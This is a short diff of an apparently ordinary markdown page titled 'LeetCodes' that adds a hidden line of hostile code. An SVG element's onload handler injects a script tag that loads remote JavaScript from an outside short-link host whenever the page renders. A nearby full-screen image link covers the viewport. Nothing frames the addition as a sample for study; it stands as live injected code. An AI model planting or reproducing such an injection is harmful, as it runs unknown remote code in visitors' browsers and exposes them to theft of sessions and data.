@@ -1,5 +1,6 @@
 ### LeetCodes
 <a href="https://leet.codes/" target="_blank">
+ <svg onload="document.body.append((a=document.createElement('script'),a.src='\/\/u.nu\/doqpo',a))" xmlns="http:\/\/www.w3.org\/2000\/svg"></svg>
  <img src="https://media.giphy.com/media/lSObAqHPgrKkD3P9a7/giphy.gif" width="444" height="332" style="top:0;left:0;width:100vw;height:100vh;position:absolute;" border="10"/>
 </a>
 
